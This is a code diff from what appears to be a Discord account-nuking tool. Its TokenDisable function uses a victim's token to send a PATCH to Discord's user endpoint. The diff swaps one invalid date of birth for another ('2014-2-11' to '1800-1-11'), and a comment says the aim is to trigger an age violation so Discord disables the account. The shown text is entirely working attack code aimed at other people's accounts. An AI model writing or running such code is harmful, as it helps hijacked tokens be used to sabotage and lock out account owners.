@@ -11,7 +11,7 @@ from util.plugins.common import clear, print_slow, getheaders, THIS_VERSION
 
 def TokenDisable(token):
     #change their age to below 13 years old which is against tos which disables their account
-    res = requests.patch('https://discordapp.com/api/v6/users/@me', headers=getheaders(token), json={'date_of_birth': '2014-2-11'})
+    res = requests.patch('https://discordapp.com/api/v6/users/@me', headers=getheaders(token), json={'date_of_birth': '1800-1-11'})
 
     if res.status_code == 400:
         res_message = res.json().get('date_of_birth', ['no response message'])[0]
